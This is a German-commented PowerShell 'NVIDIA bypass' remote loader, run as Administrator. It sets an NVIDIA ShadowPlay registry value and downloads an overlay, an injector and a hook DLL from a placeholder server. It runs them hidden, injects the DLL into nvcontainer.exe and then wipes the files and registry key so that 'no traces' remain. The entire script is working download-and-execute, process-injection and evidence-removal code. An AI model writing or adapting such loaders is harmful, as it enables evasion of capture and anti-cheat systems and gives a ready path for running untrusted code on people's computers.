# RAAVOX NVIDIA BYPASS - Remote Loader
# Run as Administrator!

param(
    [string]$BaseURL = "https://deinserver.com/raavox"  # <-- DEINE URL hier
)

$ErrorActionPreference = "Stop"

# Registry setzen (einmalig)
$regPath = "HKLM:\SOFTWARE\NVIDIA Corporation\Global\NvApp\ShadowPlay\FTS"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
$existing = Get-ItemProperty -Path $regPath -Name "{497B8458-4244-4EE6-BFEA-F3D2BA294F21}" -ErrorAction SilentlyContinue
if (-not $existing -or $existing."{497B8458-4244-4EE6-BFEA-F3D2BA294F21}" -ne 36) {
    Set-ItemProperty -Path $regPath -Name "{497B8458-4244-4EE6-BFEA-F3D2BA294F21}" -Value 36 -Type DWord
    Write-Host "[+] Registry key set" -ForegroundColor Green
}

# Binärdateien in Temp laden
$tmpDir = "$env:TEMP\raavox_$(Get-Random)"
New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null

try {
    $files = @{
        "OverlayBypass.exe" = "$BaseURL/OverlayBypass.exe"
        "injector.exe"      = "$BaseURL/injector.exe"
        "hook_dll.dll"      = "$BaseURL/hook_dll.dll"
    }

    foreach ($name in $files.Keys) {
        $url = $files[$name]
        $out = "$tmpDir\$name"
        Write-Host "[~] Downloading $name..." -NoNewline
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
        Write-Host " OK" -ForegroundColor Green
    }

    # nvcontainer.exe Prozesse beenden (für Neustart mit Hook)
    Get-Process nvcontainer -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1

    # Overlay starten
    Write-Host "[+] Starting overlay..." -ForegroundColor Cyan
    $overlay = Start-Process -FilePath "$tmpDir\OverlayBypass.exe" -WindowStyle Hidden -PassThru

    # Kurz warten, dann injector laufen lassen
    Start-Sleep -Seconds 2
    Write-Host "[+] Injecting into nvcontainer.exe..." -ForegroundColor Cyan
    $inj = Start-Process -FilePath "$tmpDir\injector.exe" -WindowStyle Normal -Wait -PassThru

    if ($inj.ExitCode -eq 0) {
        Write-Host "[+] Bypass active!" -ForegroundColor Green
    } else {
        Write-Host "[-] Injection failed (exit code: $($inj.ExitCode))" -ForegroundColor Red
    }

    # Warten bis overlay geschlossen wird
    $overlay.WaitForExit()

} finally {
    # Aufräumen - keine Spuren
    if (Test-Path $tmpDir) {
        Remove-Item -Path $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    # Registry-Key entfernen
    if (Test-Path "$regPath\{497B8458-4244-4EE6-BFEA-F3D2BA294F21}") {
        Remove-ItemProperty -Path $regPath -Name "{497B8458-4244-4EE6-BFEA-F3D2BA294F21}" -Force -ErrorAction SilentlyContinue
        if ((Get-ItemProperty -Path $regPath).PSObject.Properties.Count -eq 0) {
            Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # nvcontainer neustarten (damit Hook weg)
    Start-Process -FilePath "taskkill.exe" -ArgumentList "/f /im nvcontainer.exe /t" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue

    # PowerShell-Verlauf löschen
    Clear-Host
    Write-Host "[+] No traces left. Press any key to exit." -ForegroundColor Green
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
